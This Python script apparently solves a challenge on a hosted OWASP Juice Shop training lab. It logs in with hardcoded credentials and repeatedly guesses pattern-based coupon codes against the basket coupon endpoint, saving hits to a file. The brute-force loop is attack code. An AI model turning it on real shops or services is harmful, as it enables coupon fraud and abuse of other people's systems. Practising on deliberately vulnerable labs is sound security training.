import os
import requests
import string
import random

USER_NAME = 'jameswspears@gmail.com'
PASSWORD = 'password'
COUPON = 'mNYT0f!Cal'
VALID_FILE = os.path.join(os.path.dirname(__file__), 'valid.txt')
INVALID_FILE = os.path.join(os.path.dirname(__file__), 'invalid.txt')
ERROR_FILE = os.path.join(os.path.dirname(__file__), 'error.txt')


def random_guess():
    upper_case_char_set = string.ascii_uppercase
    lower_case_char_set = string.ascii_lowercase
    special_char_set = '!@#$&*()'
    number_char_set = '0123456789'
    upper_case_guess = ''.join(random.choice(upper_case_char_set) for _ in range(4))
    lower_case_guess = ''.join(random.choice(lower_case_char_set) for _ in range(4))
    special_char_guess = random.choice(special_char_set)
    number_char_guess = random.choice(number_char_set)
    guess = (lower_case_guess[0] + upper_case_guess[:3] + number_char_guess + lower_case_guess[1] + special_char_guess +
             upper_case_guess[3] + lower_case_guess[2:])
    return guess


def authenticate():
    d = {'email': 'jameswspears@gmail.com', 'password': 'password'}
    r = requests.post('https://juice-shop.herokuapp.com/rest/user/login', d).json()
    return r['authentication']['token'], r['authentication']['bid']


def test_coupon(token, basket_id):
    print(token)
    headers = {"Authorization": f"Bearer {token}"}
    c = random_guess()
    r = requests.put(f'https://juice-shop.herokuapp.com/rest/basket/{basket_id}/coupon/{c}', headers=headers)
    if r.status_code == 401:
        # This means our JWT expired.
        test_coupon(*authenticate())
    elif r.status_code == 404:
        # This means the coupon was invalid, save it to incorrect file and keep trying.
        with open(INVALID_FILE, 'a+') as f:
            f.write(f'{c}\n')
    elif r.status_code == 200:
        # This means we guessed a correct coupon code, save it to correct file and keep trying.
        with open(VALID_FILE, 'a+') as f:
            f.write(f'{c}\n')
    else:
        with open(ERROR_FILE, 'a+') as f:
            f.write(f'{str(r.text)}\n')

    try:
        test_coupon(*authenticate())
    except RecursionError:
        main()


def main():
    test_coupon(*authenticate())


if __name__ == '__main__':
    main()
